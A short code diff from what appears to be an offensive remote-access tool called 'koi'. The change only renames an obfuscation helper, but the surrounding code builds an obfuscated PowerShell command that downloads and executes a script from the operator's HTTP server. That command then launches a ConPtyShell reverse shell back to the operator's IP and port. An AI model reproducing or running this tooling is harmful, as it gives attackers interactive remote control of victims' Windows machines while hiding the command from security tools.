@@ -8,7 +8,7 @@ from typing import Callable, Dict, Optional
 
 from koi.session import Session
 from koi.utils.cache import cache_path, fetch_or_cache
-from koi.utils.ps_obfuscate import obfuscate_conptyshell, _obfuscate_call
+from koi.utils.ps_obfuscate import obfuscate_conptyshell, obfuscate_call
 from koi.utils.tcp import spawn_http_server, get_local_ip
 from koi.utils.ui import Spinner, notify, bold, accent
 
@@ -21,8 +21,8 @@ _CONPTYSHELL_URL = (
 def _build_invoke_cmd(
     local_ip: str, http_port: int, port: int, rows: int, cols: int, conpty_fn: str
 ) -> str:
-    iex = _obfuscate_call("Invoke-Expression")
-    iwr = _obfuscate_call("Invoke-WebRequest")
+    iex = obfuscate_call("Invoke-Expression")
+    iwr = obfuscate_call("Invoke-WebRequest")
     inner = (
         f"{iex}({iwr} 'http://{local_ip}:{http_port}/c.ps1' -UseBasicParsing);"
         f"{conpty_fn} -RemoteIp {local_ip} -RemotePort {port}"
